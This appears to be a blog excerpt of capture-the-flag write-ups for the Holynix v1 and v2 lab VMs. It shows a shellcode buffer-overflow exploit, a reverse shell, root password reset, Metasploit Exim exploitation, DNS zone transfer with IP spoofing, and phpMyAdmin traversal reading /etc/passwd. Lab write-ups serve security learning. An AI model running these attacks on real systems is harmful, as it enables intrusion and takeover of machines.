+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">root</span><span class="vi">@kali32</span><span class="ss">:~</span><span class="c1"># cat exploit.rb</span>
+</span><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j ebp,ebx,esp,eax repo/buffd</span>
+</span><span class='line'><span class="c1">#[repo/buffd]</span>
+</span><span class='line'><span class="c1">#0x0804898f call eax</span>
+</span><span class='line'><span class="c1">#0x08048efb call eax</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/exec -b &#39;\x00\xff&#39; CMD=&quot;/tmp/commands&quot; -f ruby</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">=</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\xdd\xc2\xd9\x74\x24\xf4\xbd\x38\x6f\xc2\x8c\x58\x33\xc9</span><span class="s2">&quot;</span> <span class="o">+</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb1\x0d\x31\x68\x18\x03\x68\x18\x83\xc0\x3c\x8d\x37\xe6</span><span class="s2">&quot;</span> <span class="o">+</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\x37\x09\x21\xa5\x21\xc1\x7c\x29\x24\xf6\x17\x82\x45\x91</span><span class="s2">&quot;</span> <span class="o">+</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\xe7\xb4\x86\x03\x81\x2a\x51\x20\x03\x5b\x6f\xa7\xa4\x9b</span><span class="s2">&quot;</span> <span class="o">+</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\x40\xd3\xc9\xeb\xb1\x78\x7d\x61\xa0\x1f\xef\x1d\x49\xe0</span><span class="s2">&quot;</span> <span class="o">+</span>
+</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb8\x8e\x24\x01\x8b\xb1</span><span class="s2">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">124</span> <span class="o">-</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span>
+</span><span class='line'><span class="n">exploit</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x0804898f</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+</span><span class='line'><span class="n">host</span> <span class="o">||=</span> <span class="s2">&quot;192.168.80.143&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;Using host: </span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">7777</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Exploit runs arbitrary command that we put on vulnerable server to /tmp/commands.</p>
+
+<p>We connect to the host:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/home/testuser $ :backdoor.reversetcp -port 1337 192.168.80.137 -no-connect
+</span><span class='line'>
+</span><span class='line'>root@kali32:~# nc -lvp 1337
+</span><span class='line'>listening on [any] 1337 ...
+</span><span class='line'>192.168.80.143: inverse host lookup failed: Unknown server error : Connection timed out
+</span><span class='line'>connect to [192.168.80.137] from (UNKNOWN) [192.168.80.143] 32787
+</span><span class='line'>sh: no job control in this shell
+</span><span class='line'>sh-2.05b$ cd /tmp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To obtain root privileges, we can run ssh server and put to &lsquo;/tmp/commands&rsquo;
+file the instructions to change root password:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>debian:/tmp# chmod +x commands
+</span><span class='line'>debian:/tmp# cat commands
+</span><span class='line'>echo -e "1234\n1234\n" | passwd</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Kernel is vulnerable too, using this exploit we can get uid 0 privileges:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-2.05b$ wget -O socksend.c http://www.exploit-db.com/download/9479</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In Metasploit is there is another module which we can use to exploit Exim4
+(exploit/unix/smtp/exim4_string_format). To make it work correctly, we need
+to comment the following lines and also change exim to exim4:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="mi">114</span>     <span class="c1">#if not datastore[&#39;SkipVersionCheck&#39;] and self.banner !~ /Exim 4\.6\d+/i</span>
+</span><span class='line'><span class="mi">115</span>     <span class="c1">#  fail_with(Failure::Unknown, &quot;Warning: This version of Exim is not exploitable&quot;)</span>
+</span><span class='line'><span class="mi">116</span>     <span class="c1">#end</span>
+</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span>
+</span><span class='line'><span class="mi">341</span>       <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;PATH=/bin:/sbin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin exim4 -C</span><span class="si">#{</span><span class="n">temp_conf</span><span class="si">}</span><span class="s2"> -q</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(exim4_string_format) > rexploit
+</span><span class='line'>[*] Reloading module...
+</span><span class='line'>
+</span><span class='line'>[*] Started reverse double handler
+</span><span class='line'>[*] Connecting to 192.168.80.143:25 ...
+</span><span class='line'>[*] Server: 220 localhost.localdomain ESMTP Exim 4.50 Sat, 09 May 2015 07:53:30 +0200
+</span><span class='line'>[*] EHLO: 250-localhost.localdomain Hello cpR0uwxe.com [192.168.80.137]
+</span><span class='line'>[*] EHLO: 250-SIZE 52428800
+</span><span class='line'>[*] EHLO: 250-PIPELINING
+</span><span class='line'>[*] EHLO: 250 HELP
+</span><span class='line'>[*] Determined our hostname is cpR0uwxe.com and IP address is 192.168.80.137
+</span><span class='line'>[*] MAIL: 250 OK
+</span><span class='line'>[*] RCPT: 250 Accepted
+</span><span class='line'>[*] DATA: 354 Enter message, ending with "." on a line by itself
+</span><span class='line'>[*] Constructing initial headers ...
+</span><span class='line'>[*] Constructing HeaderX ...
+</span><span class='line'>[*] Constructing body ...
+</span><span class='line'>[*] Sending 50 megabytes of data...
+</span><span class='line'>[*] Ending first message.
+</span><span class='line'>[*] Result: "552 Message size exceeds maximum permitted\r\n"
+</span><span class='line'>[*] Sending second message ...
+</span><span class='line'>[*] MAIL result: "250 OK\r\n"
+</span><span class='line'>[*] RCPT result: "sh-2.05b$ "
+</span><span class='line'>[*] Looking for Perl to facilitate escalation...
+</span><span class='line'>[*] Perl binary detected, attempt to escalate...
+</span><span class='line'>[*] Using Perl interpreter at /usr/bin/perl...
+</span><span class='line'>[*] Creating temporary files /var/tmp/oYEMVjYJ and /var/tmp/LCpxpIyv...
+</span><span class='line'>[*] Attempting to execute payload as root...
+</span><span class='line'>[*] Accepted the first client connection...
+</span><span class='line'>[*] Accepted the second client connection...
+</span><span class='line'>[*] Command: echo QDibz6UzrEBUyJQT;
+</span><span class='line'>[*] Writing to socket A
+</span><span class='line'>[*] Writing to socket B
+</span><span class='line'>[*] Reading from sockets...
+</span><span class='line'>[*] Reading from socket B
+</span><span class='line'>[*] B: "QDibz6UzrEBUyJQT\r\n"
+</span><span class='line'>[*] Matching...
+</span><span class='line'>[*] A is input...
+</span><span class='line'>[*] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.143:32803) at 2015-05-06 07:40:24 +0200
+</span><span class='line'>
+</span><span class='line'>id
+</span><span class='line'>uid=0(root) gid=0(root)</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/10/holynix-v2/">Holynix: V2</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-10T14:35:19+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:35 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/holynix-v2,21/">Holynix: v2</a></p>
+
+<p>We set our network preferences to &ldquo;Share with my Mac&rdquo; on both vulnerable server
+and Kali Linux. Our NIC address will be the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.11</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nmap output for 192.168.1.88:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE  SERVICE
+</span><span class='line'>20/tcp closed ftp-data
+</span><span class='line'>21/tcp open   ftp 
+</span><span class='line'>22/tcp open   ssh 
+</span><span class='line'>53/tcp open   domain
+</span><span class='line'>80/tcp open   http</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We add to /etc/hosts:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.88 www.zincftp.com
+</span><span class='line'>192.168.1.88 zincftp.com</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Asking DNS server about the domain reports:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com
+</span><span class='line'>
+</span><span class='line'>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com
+</span><span class='line'>; (1 server found)
+</span><span class='line'>;; global options: +cmd
+</span><span class='line'>;; Got answer:
+</span><span class='line'>;; ->>HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 28383
+</span><span class='line'>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2
+</span><span class='line'>
+</span><span class='line'>;; QUESTION SECTION:
+</span><span class='line'>;zincftp.com.                   IN      A
+</span><span class='line'>
+</span><span class='line'>;; ANSWER SECTION:
+</span><span class='line'>zincftp.com.            38400   IN      A       192.168.1.88
+</span><span class='line'>
+</span><span class='line'>;; AUTHORITY SECTION:
+</span><span class='line'>zincftp.com.            38400   IN      NS      ns1.zincftp.com.
+</span><span class='line'>zincftp.com.            38400   IN      NS      ns2.zincftp.com.
+</span><span class='line'>
+</span><span class='line'>;; ADDITIONAL SECTION:
+</span><span class='line'>ns1.zincftp.com.        38400   IN      A       192.168.1.88
+</span><span class='line'>ns2.zincftp.com.        38400   IN      A       192.168.1.89
+</span><span class='line'>
+</span><span class='line'>;; Query time: 3 msec
+</span><span class='line'>;; SERVER: 192.168.1.88#53(192.168.1.88)
+</span><span class='line'>;; WHEN: Sun May  3 01:04:27 2015
+</span><span class='line'>;; MSG SIZE  rcvd: 113</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We append these lines to /etc/hosts and try DNS AXFR (zone transfer):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.88 ns1.zincftp.com
+</span><span class='line'>192.168.1.89 ns2.zincftp.com</span></code></pre></td></tr></table></div></figure>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com axfr
+</span><span class='line'>
+</span><span class='line'>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com axfr
+</span><span class='line'>; (1 server found)
+</span><span class='line'>;; global options: +cmd
+</span><span class='line'>; Transfer failed.
+</span><span class='line'>root@kali32:~# dig @192.168.1.89 zincftp.com axfr
+</span><span class='line'>;; Connection to 192.168.1.89#53(192.168.1.89) for zincftp.com failed: host unreachable.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We change our IP address to the IP of the not reachable DNS server and try AXFR again:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.89
+</span><span class='line'>root@kali32:~# dig @192.168.1.89 zincftp.com axfr
+</span><span class='line'>
+</span><span class='line'>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> @192.168.1.88 zincftp.com axfr
+</span><span class='line'>; (1 server found)
+</span><span class='line'>;; global options: +cmd
+</span><span class='line'>zincftp.com.            38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
+</span><span class='line'>zincftp.com.            38400   IN      NS      ns1.zincftp.com.
+</span><span class='line'>zincftp.com.            38400   IN      NS      ns2.zincftp.com.
+</span><span class='line'>zincftp.com.            38400   IN      MX      10 mta.zincftp.com.
+</span><span class='line'>zincftp.com.            38400   IN      A       192.168.1.88
+</span><span class='line'>ahuxley.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>amckinley.zincftp.com.  38400   IN      A       192.168.1.88
+</span><span class='line'>bzimmerman.zincftp.com. 38400   IN      A       192.168.1.88
+</span><span class='line'>cbergey.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>cfinnerly.zincftp.com.  38400   IN      A       192.168.1.88
+</span><span class='line'>cjalong.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>cmahong.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>cmanson.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>ddonnovan.zincftp.com.  38400   IN      A       192.168.1.88
+</span><span class='line'>ddypsky.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>dev.zincftp.com.        38400   IN      A       192.168.1.88
+</span><span class='line'>dhammond.zincftp.com.   38400   IN      A       192.168.1.88
+</span><span class='line'>dmoran.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>dsummers.zincftp.com.   38400   IN      A       192.168.1.88
+</span><span class='line'>evorhees.zincftp.com.   38400   IN      A       192.168.1.88
+</span><span class='line'>gwelch.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>hmcknight.zincftp.com.  38400   IN      A       192.168.1.88
+</span><span class='line'>jgacy.zincftp.com.      38400   IN      A       192.168.1.88
+</span><span class='line'>jsmith.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>jstreet.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>kmccallum.zincftp.com.  38400   IN      A       192.168.1.88
+</span><span class='line'>lnickerbacher.zincftp.com. 38400 IN     A       192.168.1.88
+</span><span class='line'>lsanderson.zincftp.com. 38400   IN      A       192.168.1.88
+</span><span class='line'>lwestre.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>mta.zincftp.com.        38400   IN      A       10.0.192.48
+</span><span class='line'>ncobol.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>ns1.zincftp.com.        38400   IN      A       192.168.1.88
+</span><span class='line'>ns2.zincftp.com.        38400   IN      A       192.168.1.89
+</span><span class='line'>rcropper.zincftp.com.   38400   IN      A       192.168.1.88
+</span><span class='line'>rfrost.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>rwoo.zincftp.com.       38400   IN      A       192.168.1.88
+</span><span class='line'>skrymple.zincftp.com.   38400   IN      A       192.168.1.88
+</span><span class='line'>splath.zincftp.com.     38400   IN      A       192.168.1.88
+</span><span class='line'>tmartin.zincftp.com.    38400   IN      A       192.168.1.88
+</span><span class='line'>trusted.zincftp.com.    38400   IN      A       192.168.1.34
+</span><span class='line'>www.zincftp.com.        38400   IN      A       192.168.1.88
+</span><span class='line'>zincftp.com.            38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
+</span><span class='line'>;; Query time: 5 msec
+</span><span class='line'>;; SERVER: 192.168.1.88#53(192.168.1.88)
+</span><span class='line'>;; WHEN: Sun May  3 01:08:24 2015
+</span><span class='line'>;; XFR size: 42 records (messages 1, bytes 1021)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Appending the list to /etc/hosts:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~# dig @192.168.1.88 zincftp.com axfr <span class="p">|</span> egrep <span class="s1">&#39;192.168.1.88$&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;{ print $5 &quot; &quot; $1}&#39;</span>  <span class="p">|</span> sed <span class="s1">&#39;s#.$##&#39;</span> &gt;&gt; /etc/hosts
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Dirb reports the following URLs:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>---- Scanning URL: http://www.zincftp.com/ ----
+</span><span class='line'>+ http://www.zincftp.com/index (CODE:200|SIZE:1205)
+</span><span class='line'>+ http://www.zincftp.com/index.php (CODE:200|SIZE:1205)
+</span><span class='line'>+ http://www.zincftp.com/phpMyAdmin (CODE:403|SIZE:333)
+</span><span class='line'>+ http://www.zincftp.com/register (CODE:200|SIZE:16)
+</span><span class='line'>+ http://www.zincftp.com/server-status (CODE:403|SIZE:336)
+</span><span class='line'>+ http://www.zincftp.com/setup_guides</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In particular the interesting file was <a href="http://www.zincftp.com/setup_guides/todo">http://www.zincftp.com/setup_guides/todo</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;!--
+</span><span class='line'>Adding new users to the system
+</span><span class='line'>- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+</span><span class='line'>
+</span><span class='line'>create user
+</span><span class='line'>        useradd -g ftp_users -s /bin/false -d /home/&lt;username&gt; -m &lt;username&gt;
+</span><span class='line'>
+</span><span class='line'>create web dir
+</span><span class='line'>        mkdir /home/&lt;username&gt;/web
+</span><span class='line'>
+</span><span class='line'><span class="nb">set </span>ownership so ftp can write to dir
+</span><span class='line'>        chown -R vftp:ftp_users /home/&lt;username&gt;
+</span><span class='line'>
+</span><span class='line'>add ftp user
+</span><span class='line'>        pure-pw useradd &lt;username&gt; -u vftp -g ftp_users -d /home/&lt;username&gt;
+</span><span class='line'>
+</span><span class='line'>update /etc/pure-ftpd/pureftpd.passwd file
+</span><span class='line'>        pure-pw mkdb
+</span><span class='line'>--&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Again we set our IP address to match the &ldquo;trusted.zincftp.com&rdquo; host, to get access to phpmyadmin:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.34</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We found nothing interesting in phpmyadmin, but it&rsquo;s vulnerable and we can interpret the arbitrary file on web server as PHP script.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# ./searchsploit phpmyadmin | grep 2.6
+</span><span class='line'>phpMyAdmin 2.6.4-pl1 - Remote Directory Traversal Exploit | /php/webapps/1244.pl
+</span><span class='line'>root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../etc/passwd
+</span><span class='line'>
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
